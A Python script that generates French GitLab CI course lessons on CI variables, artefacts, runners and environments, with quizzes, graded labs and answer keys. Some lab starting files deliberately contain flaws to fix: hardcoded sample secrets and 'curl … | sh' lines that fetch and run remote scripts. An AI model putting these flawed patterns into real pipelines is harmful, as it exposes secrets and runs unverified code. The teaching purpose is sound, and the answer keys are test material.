T.append(lesson("variables", "Variables CI/CD, masquées et protégées", 18,
  ["Sortir les secrets du fichier de pipeline", "Choisir masquée, protégée, fichier"],
  [t("Tout ce qui est dans .gitlab-ci.yml est versionné et lisible par quiconque lit le dépôt. Les secrets vont dans "
     "Paramètres → CI/CD → Variables."),
   t("« Masquée » cache la valeur dans les journaux ; « protégée » la réserve aux branches et tags protégés ; le type « Fichier » "
     "écrit la valeur dans un fichier temporaire dont le chemin est fourni (idéal pour un kubeconfig)."),
   code("deploy:\n  script:\n    - ./deploy.sh --token \"$DEPLOY_TOKEN\"", "La variable est fournie par GitLab, pas écrite dans le fichier"),
   warn("Une variable non protégée est lisible par une MR qui modifie la pipeline : n'y mettez pas de secret de production.")],
  [single("gl-6-1", "Où mettre un jeton de déploiement ?", ["Paramètres → CI/CD → Variables", "variables: dans .gitlab-ci.yml", "Le README", "Un commentaire"], 0, "Le secret reste hors du dépôt versionné."),
   single("gl-6-2", "« Protégée » signifie…", ["Disponible uniquement sur branches/tags protégés", "Masquée dans les journaux", "Chiffrée en base64", "Lisible par tous"], 0, "Ne pas confondre avec « masquée »."),
   single("gl-6-3", "Type de variable adapté à un kubeconfig ?", ["Fichier", "Variable simple", "Label", "Tag"], 0, "Son chemin est fourni dans la variable."),
   single("gl-6-4", "Masquer une variable suffit-il à la protéger d'une MR malveillante ?", ["Non, il faut aussi la protéger", "Oui", "Seulement sur gitlab.com", "Seulement en privé"], 0, "Une MR peut l'envoyer ailleurs.")],
  lab("gitlabci", "Le mot de passe de la base est écrit dans la pipeline. Sortez-le.",
      "variables:\n  DB_PASSWORD: \"motdepasse-prod-42\"\n\ntests:\n  image: python:3.12.7-slim\n  script:\n    - pytest\n",
      [no("GL002", "Plus de secret dans le fichier"), clean()],
      "Supprimez la variable du fichier : elle sera définie dans Paramètres → CI/CD → Variables (masquée et protégée).",
      "tests:\n  image: python:3.12.7-slim\n  script:\n    - pytest\n")))

T.append(lesson("artefacts-cache", "Artefacts, cache et règles", 18,
  ["Distinguer cache et artefact", "Limiter la durée de conservation", "Déclencher un job selon des règles"],
  [t("Le cache accélère (dépendances réutilisées d'une pipeline à l'autre, sans garantie). Un artefact transmet un résultat "
     "(build, rapport) aux jobs suivants et peut se télécharger."),
   code("build:\n  script: [npm ci, npm run build]\n  artifacts:\n    paths: [dist/]\n    expire_in: 1 week\n  cache:\n    key:\n      files: [package-lock.json]\n    paths: [node_modules/]",
        "Artefact à durée limitée, cache indexé sur le fichier de verrouillage"),
   code("rules:\n  - if: $CI_PIPELINE_SOURCE == \"merge_request_event\"\n  - if: $CI_COMMIT_BRANCH == $CI_DEFAULT_BRANCH", "Exécuter seulement pour les MR et la branche par défaut"),
   tip("Sans expire_in, les artefacts s'accumulent et remplissent le stockage du projet.")],
  [single("gl-7-1", "Différence cache / artefact ?", ["Cache = accélérer ; artefact = transmettre un résultat", "Aucune", "Artefact = accélérer", "Cache = publier"], 0, "Ne comptez pas sur le cache pour la justesse."),
   single("gl-7-2", "Pourquoi expire_in ?", ["Limiter la conservation des artefacts", "Accélérer le job", "Chiffrer", "Publier"], 0, "Le stockage n'est pas infini."),
   single("gl-7-3", "Clé de cache recommandée ?", ["Le fichier de verrouillage des dépendances", "La date du jour", "Le nom du développeur", "Aucune"], 0, "Le cache change quand les dépendances changent."),
   single("gl-7-4", "rules: sert à…", ["Décider quand un job s'exécute", "Définir l'image", "Stocker des secrets", "Créer un runner"], 0, "Remplace only/except.")],
  lab("gitlabci", "Les artefacts de ce build sont conservés indéfiniment. Limitez leur durée.",
      "build:\n  image: node:22.11-slim\n  script:\n    - npm ci\n    - npm run build\n  artifacts:\n    paths: [dist/]\n",
      [no("GL004", "Durée de conservation fixée"), valid()], "Ajoutez expire_in: 1 week dans artifacts.",
      "build:\n  image: node:22.11-slim\n  script:\n    - npm ci\n    - npm run build\n  artifacts:\n    paths: [dist/]\n    expire_in: 1 week\n")))

T.append(lesson("runners", "Runners : qui exécute vos jobs ?", 18,
  ["Distinguer runners partagés et dédiés", "Évaluer le risque d'un runner et de ses scripts"],
  [t("Un runner est la machine qui exécute les jobs. Runners partagés (fournis par gitlab.com), de groupe ou de projet ; "
     "exécuteurs docker (conteneur jetable par job), shell (directement sur la machine), kubernetes."),
   warn("Un runner « shell » exécute les scripts de la pipeline avec les droits du compte gitlab-runner, sur une machine "
        "persistante : une MR malveillante peut y laisser une porte dérobée. Préférez docker et des runners dédiés aux projets de confiance."),
   t("Un script de pipeline qui fait curl … | sh exécute du code distant non vérifié sur le runner, avec les variables CI."),
   code("gitlab-runner register --url https://gitlab.com --executor docker --docker-image alpine:3.20", "Enregistrer un runner docker (auto-hébergé)")],
  [single("gl-8-1", "Risque principal d'un exécuteur shell ?", ["Les jobs tournent directement sur une machine persistante", "Il est lent", "Il ne supporte pas Git", "Il est payant"], 0, "Pas d'isolation entre jobs."),
   single("gl-8-2", "Exécuteur qui donne un conteneur jetable par job ?", ["docker", "shell", "ssh", "parallels"], 0, "Chaque job repart d'une image propre."),
   single("gl-8-3", "Que fait curl … | sh dans un job ?", ["Exécute un script distant non vérifié avec les variables CI", "Accélère la pipeline", "Rien de grave", "Met en cache"], 0, "Téléchargez, vérifiez, exécutez."),
   cmd("gl-8-4", "Listez les runners enregistrés sur la machine.", ["gitlab-runner list", "sudo gitlab-runner list"], "Affiche nom, exécuteur et URL.")],
  lab("gitlabci", "Ce job installe un outil en exécutant un script distant. Vérifiez-le avant de l'exécuter.",
      "scan:\n  image: alpine:3.20\n  script:\n    - apk add --no-cache curl\n    - curl -sSL https://exemple.org/install.sh | sh\n    - outil scan .\n",
      [no("GL005", "Plus de curl | sh"), has("sha256sum -c", "Empreinte vérifiée"), clean()],
      "Téléchargez dans un fichier (curl -o), vérifiez avec sha256sum -c, puis lancez sh install.sh.",
      "scan:\n  image: alpine:3.20\n  script:\n    - apk add --no-cache curl\n    - curl -sSLo install.sh https://exemple.org/install.sh\n    - echo \"$INSTALL_SHA256  install.sh\" | sha256sum -c -\n    - sh install.sh\n    - outil scan .\n")))

T.append(lesson("environnements", "Environnements et déploiements maîtrisés", 18,
  ["Déclarer un environnement", "Exiger une action humaine avant la production"],
  [code("deploy_prod:\n  stage: deploy\n  environment:\n    name: production\n    url: https://exemple.org\n  rules:\n    - if: $CI_COMMIT_BRANCH == $CI_DEFAULT_BRANCH\n      when: manual\n  script:\n    - ./deploy.sh",
        "Déploiement manuel en production depuis la branche par défaut"),
   t("Un environnement garde l'historique des déploiements et permet de revenir à une version précédente (« Rollback »)."),
   t("Les environnements protégés restreignent qui peut déployer ; when: manual demande un clic explicite, journalisé."),
   tip("Déployer automatiquement en recette (staging) et manuellement en production est un bon compromis.")],
  [single("gl-9-1", "Effet de when: manual ?", ["Le job attend un déclenchement humain", "Le job est supprimé", "Le job tourne deux fois", "Le job ignore les erreurs"], 0, "Un clic explicite et tracé."),
   single("gl-9-2", "Intérêt de déclarer environment: ?", ["Historique des déploiements et retour arrière", "Plus de mémoire", "Variables publiques", "Aucun"], 0, "Visible dans Operate → Environments."),
   single("gl-9-3", "Un environnement protégé…", ["Restreint qui peut y déployer", "Est invisible", "Bloque la CI", "Supprime les variables"], 0, "Contrôle d'accès au déploiement."),
   single("gl-9-4", "Compromis courant ?", ["Recette automatique, production manuelle", "Tout manuel", "Tout automatique sans tests", "Pas d'environnement"], 0, "Rapide en recette, maîtrisé en production.")],
  lab("gitlabci", "Ce job déploie en production à chaque push, sans validation. Ajoutez une garde humaine.",
      "deploy_prod:\n  image: alpine:3.20\n  environment:\n    name: production\n  script:\n    - ./deploy.sh\n",
      [no("GL003", "Déploiement validé manuellement"), valid()], "Ajoutez when: manual (ou une règle rules: avec when: manual).",
      "deploy_prod:\n  image: alpine:3.20\n  environment:\n    name: production\n  rules:\n    - if: $CI_COMMIT_BRANCH == $CI_DEFAULT_BRANCH\n      when: manual\n  script:\n    - ./deploy.sh\n")))

gitlab_project = {"title": "Pipeline GitLab de bout en bout",
  "brief": "Rédigez la pipeline d'une API : tests, build avec artefact, déploiement en production sous contrôle humain, sans secret dans le fichier.",
  "lab": lab("gitlabci", "Objectif : aucun problème bloquant ni avertissement.",
      "variables:\n  API_TOKEN: \"tok-prod-123456\"\n\nstages: [test, build, deploy]\n\ntests:\n  stage: test\n  image: python\n  script:\n    - pytest\n\nbuild:\n  stage: build\n  image: python:latest\n  script:\n    - python -m build\n  artifacts:\n    paths: [dist/]\n\n"
      "deploy_prod:\n  stage: deploy\n  image: alpine:3.20\n  environment:\n    name: production\n  script:\n    - curl -sSL https://exemple.org/deploy.sh | sh\n",
      [clean(), nowarn(), no("GL003", "Production validée à la main"), no("GL004", "Artefacts à durée limitée")],
      "Reprenez les labos : secret dans les variables du projet, images épinglées, expire_in, script vérifié, when: manual.",
      "stages: [test, build, deploy]\n\ntests:\n  stage: test\n  image: python:3.12.7-slim\n  script:\n    - pytest\n\nbuild:\n  stage: build\n  image: python:3.12.7-slim\n  script:\n    - python -m build\n  artifacts:\n    paths: [dist/]\n    expire_in: 1 week\n\n"
      "deploy_prod:\n  stage: deploy\n  image: alpine:3.20\n  environment:\n    name: production\n  rules:\n    - if: $CI_COMMIT_BRANCH == $CI_DEFAULT_BRANCH\n      when: manual\n  script:\n    - ./deploy.sh\n"),
  "rubric": rubric(
    ("Secrets", "Dans le fichier", "Variables CI/CD", "Variables masquées et protégées, environnement protégé"),
    ("Reproductibilité", "Images latest", "Images épinglées", "Images épinglées et cache indexé sur le fichier de verrouillage"),
    ("Déploiement", "Automatique en production", "when: manual", "Recette automatique, production manuelle protégée, rollback documenté"),
    ("Exécution", "Scripts distants non vérifiés", "Empreintes vérifiées", "Runner docker dédié, scripts versionnés"),
    ("Sobriété", "Artefacts conservés indéfiniment", "expire_in", "expire_in, needs: et interruptible pour économiser les minutes"))}

gitlab_glossary = [
  ("Groupe", "Ensemble de projets partageant membres et réglages."), ("Merge request", "Demande de fusion relue (équivalent d'une PR)."),
  ("Draft", "MR en brouillon, non fusionnable."), ("Pipeline", "Ensemble des jobs déclenchés par un commit ou une MR."),
  ("Stage", "Étape d'une pipeline regroupant des jobs parallèles."), ("Job", "Unité de travail exécutée par un runner."),
  ("Runner", "Machine ou service qui exécute les jobs."), ("Exécuteur", "Mode d'exécution d'un runner (docker, shell, kubernetes)."),
  ("Variable protégée", "Variable fournie uniquement aux branches et tags protégés."), ("Variable masquée", "Variable cachée dans les journaux."),
  ("Artefact", "Fichier produit par un job et transmis ou téléchargeable."), ("Cache", "Fichiers réutilisés entre pipelines pour accélérer."),
  ("Environment", "Cible de déploiement avec historique et retour arrière."), ("Deploy token", "Jeton machine à accès limité à un projet."),
]

write_module("gitlab", "GitLab, l'arsenal intégré",
  "Organiser projets et accès, collaborer par merge requests, et écrire des pipelines GitLab CI sûres jusqu'au déploiement.",
  ["Attribuer des accès minimaux", "Collaborer par MR sur des branches protégées",
   "Écrire des pipelines reproductibles sans secret", "Maîtriser runners et déploiements"],
  ["Module Git"], T, gitlab_project, gitlab_glossary)
